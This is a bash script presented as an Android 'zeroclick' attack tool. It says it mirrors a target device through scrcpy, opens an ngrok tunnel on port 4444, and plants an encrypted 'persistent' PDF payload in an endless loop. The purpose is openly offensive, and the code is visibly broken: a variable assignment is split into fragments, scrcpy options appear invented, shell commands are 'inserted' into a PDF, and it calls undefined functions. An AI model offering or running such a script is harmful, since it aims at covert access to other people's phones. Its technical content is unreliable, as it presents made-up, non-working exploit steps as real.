#!/bin/bash

# This script mirrors an Android device using scrcpy and delivers the  persistent Zeroclick PDF payload.

echo "
 █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗     ███████╗ ██████╗██████╗     ███████╗███████╗██████╗  ██████╗  ██████╗██╗     ██╗ ██████╗██╗  ██╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██║     ██║██╔════╝██║ ██╔╝
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║    █████╗  ██║     ██████╔╝      ███╔╝ █████╗  ██████╔╝██║   ██║██║     ██║     ██║██║     █████╔╝ 
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║    ██╔══╝  ██║     ██╔═══╝      ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║     ██║     ██║██║     ██╔═██╗ 
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║██████╔╝    ██║     ╚██████╗██║         ███████╗███████╗██║  ██║╚██████╔╝╚██████╗███████╗██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝     ╚═╝      ╚═════╝╚═╝         ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝
"
# Usage:
# ./zeroclick.sh <android_device_ip> <pdf_file_1> <pdf_file_2>

# Variables
android_device_ip=$1
pdf_payload_part_1=$2
pdf_payload_part_2=3ngrokt
unnelu
rl=(ngrok status | grep "Forwarding" | awk '{print $2}')
command_file="/tmp/command.txt"
fragmented_pdf_payload="/tmp/fragmented_pdf_payload"

# Functions
function mirror_android_device() {
  # Get the IP address of the Android device
  android_device_ip="$1"

  # Check if the Android device is reachable
  if [[ ! $(ping -c 1 $android_device_ip) ]]; then
    echo "Error: Android device is not reachable."
    exit 1
  fi

  # Start a scrcpy session with the Android device
  scrcpy -d "$android_device_ip" --background --auto-connect yes
}

function generate_pdf_payload() {
  # Combine the two PDF files into one
  pdftk "$pdf_payload_part_1" "$pdf_payload_part_2" output "$fragmented_pdf_payload"

  # Add the scrcpy command to the PDF payload
  pdftk "$fragmented_pdf_payload" insert "scrcpy -d $(get_device_id) --background --auto-connect yes --load "$fragmented_pdf_payload.persistent.enc"" output "$fragmented_pdf_payload"
}

function encrypt_pdf_payload() {
  # Encrypt the PDF payload with AES-256
  openssl aes-256-cbc -salt -in "$fragmented_pdf_payload" -out "$fragmented_pdf_payload.enc" -k "password"

  # Create a copy of the PDF payload
  cp "$fragmented_pdf_payload" "$fragmented_pdf_payload.persistent"

  # Encrypt the copy of the PDF payload
  openssl aes-256-cbc -salt -in "$fragmented_pdf_payload.persistent" -out "$fragmented_pdf_payload.persistent.enc" -k "password"
}

function cleanup() {
  # Delete the temporary files
  rm -f "$command_file" "$fragmented_pdf_payload" "$fragmented_pdf_payload.enc"
}

# Start the ngrok tunnel
ngrok start 4444

# Generate the PDF payload
generate_pdf_payload

# Encrypt the PDF payload
encrypt_pdf_payload

# Start the persistent zeroclick payload
while true; do
  # Check if the scrcpy service is running
  if [[ ! $(ps aux | grep scrcpy | wc -l) -gt 0 ]]; then
    # Start the scrcpy service with the persistent PDF payload
    scrcpy -d "$android_device_ip" --background --auto-connect yes --load "$fragmented_pdf_payload.persistent.enc"
  fi

  # Sleep for a few seconds
  sleep 10
done

# Trap the SIGINT and SIGTERM signals to stop the persistent zeroclick payload before exiting
trap 'stop_persistent_zeroclick_payload' SIGINT SIGTERM

# Wait for the user to press Ctrl+C or kill the script
wait
